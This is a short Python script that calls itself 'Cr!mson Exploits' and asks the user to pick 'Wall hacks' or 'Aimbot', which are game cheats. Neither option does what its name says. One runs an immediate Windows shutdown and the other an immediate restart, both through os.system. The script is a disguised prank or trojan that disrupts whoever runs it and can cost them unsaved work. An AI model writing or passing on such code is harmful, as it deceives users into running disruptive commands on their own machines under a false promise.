import os

print('Cr!mson Exploits')


def shutdown():
    os.system("shutdown /s /t 0 ")


def restart():
    os.system("shutdown /r /t 0 ")


X = (input('Select Exploit 1.Wall hacks, 2.Aimbot: '))

if X == '1':
    shutdown()

elif X == '2':
    restart()

else:
    print('invalid/unknown input')
